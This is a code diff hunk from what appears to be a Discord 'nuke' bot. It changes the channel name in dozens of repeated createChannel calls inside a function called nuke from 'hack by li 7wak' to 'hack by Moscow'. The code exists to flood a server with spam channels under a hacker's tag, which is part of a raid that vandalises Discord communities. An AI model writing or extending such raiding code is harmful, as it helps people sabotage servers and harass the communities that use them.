@@ -418,60 +418,60 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('hack by li 7wak', 'text');
+    await guild.createChannel('hack by Moscow', 'text');
  
-      await guild.createChannel('hack by li 7wak', 'voice');
- await guild.createChannel('hack by li 7wak', 'text');
+      await guild.createChannel('hack by Moscow', 'voice');
+ await guild.createChannel('hack by Moscow', 'text');
  
- await guild.createChannel('hack by li 7wak', 'text');
-  await guild.createChannel('hack by li 7wak', 'text');
+ await guild.createChannel('hack by Moscow', 'text');
+  await guild.createChannel('hack by Moscow', 'text');
  
-      await guild.createChannel('hack by li 7wak', 'voice');
- await guild.createChannel('hack by li 7wak', 'text');
+      await guild.createChannel('hack by Moscow', 'voice');
+ await guild.createChannel('hack by Moscow', 'text');
  
- await guild.createChannel('hack by li 7wak', 'text');
-  await guild.createChannel('hack by li 7wak', 'text');
+ await guild.createChannel('hack by Moscow', 'text');
+  await guild.createChannel('hack by Moscow', 'text');
  
-      await guild.createChannel('hack by li 7wak', 'voice');
- await guild.createChannel('hack by li 7wak', 'text');
+      await guild.createChannel('hack by Moscow', 'voice');
+ await guild.createChannel('hack by Moscow', 'text');
  
- await guild.createChannel('hack by li 7wak', 'text');
-  await guild.createChannel('hack by li 7wak', 'text');
+ await guild.createChannel('hack by Moscow', 'text');
+  await guild.createChannel('hack by Moscow', 'text');
  
-      await guild.createChannel('hack by li 7wak', 'voice');
- await guild.createChannel('hack by li 7wak', 'text');
+      await guild.createChannel('hack by Moscow', 'voice');
+ await guild.createChannel('hack by Moscow', 'text');
  
- await guild.createChannel('hack by li 7wak', 'text');
-  await guild.createChannel('hack by li 7wak', 'text');
+ await guild.createChannel('hack by Moscow', 'text');
+  await guild.createChannel('hack by Moscow', 'text');
  
-      await guild.createChannel('hack by li 7wak', 'voice');
- await guild.createChannel('hack by li 7wak', 'text');
+      await guild.createChannel('hack by Moscow', 'voice');
+ await guild.createChannel('hack by Moscow', 'text');
  
- await guild.createChannel('hack by li 7wak', 'text');
-  await guild.createChannel('hack by li 7wak', 'text');
+ await guild.createChannel('hack by Moscow', 'text');
+  await guild.createChannel('hack by Moscow', 'text');
  
-      await guild.createChannel('hack by li 7wak', 'voice');
- await guild.createChannel('hack by li 7wak', 'text');
+      await guild.createChannel('hack by Moscow', 'voice');
+ await guild.createChannel('hack by Moscow', 'text');
  
- await guild.createChannel('hack by li 7wak', 'text');
-  await guild.createChannel('hack by li 7wak', 'text');
+ await guild.createChannel('hack by Moscow', 'text');
+  await guild.createChannel('hack by Moscow', 'text');
  
-      await guild.createChannel('hack by li 7wak', 'voice');
- await guild.createChannel('hack by li 7wak', 'text');
+      await guild.createChannel('hack by Moscow', 'voice');
+ await guild.createChannel('hack by Moscow', 'text');
  
- await guild.createChannel('hack by li 7wak', 'text');
-  await guild.createChannel('hack by li 7wak', 'text');
+ await guild.createChannel('hack by Moscow', 'text');
+  await guild.createChannel('hack by Moscow', 'text');
  
-      await guild.createChannel('hack by li 7wak', 'voice');
- await guild.createChannel('hack by li 7wak', 'text');
+      await guild.createChannel('hack by Moscow', 'voice');
+ await guild.createChannel('hack by Moscow', 'text');
  
- await guild.createChannel('hack by li 7wak', 'text');
-  await guild.createChannel('hack by li 7wak', 'text');
+ await guild.createChannel('hack by Moscow', 'text');
+  await guild.createChannel('hack by Moscow', 'text');
  
-      await guild.createChannel('hack by li 7wak', 'voice');
- await guild.createChannel('hack by li 7wak', 'text');
+      await guild.createChannel('hack by Moscow', 'voice');
+ await guild.createChannel('hack by Moscow', 'text');
  
- await guild.createChannel('hack by li 7wak', 'text');
+ await guild.createChannel('hack by Moscow', 'text');
 }
  
 LOka.on('ready', () => {
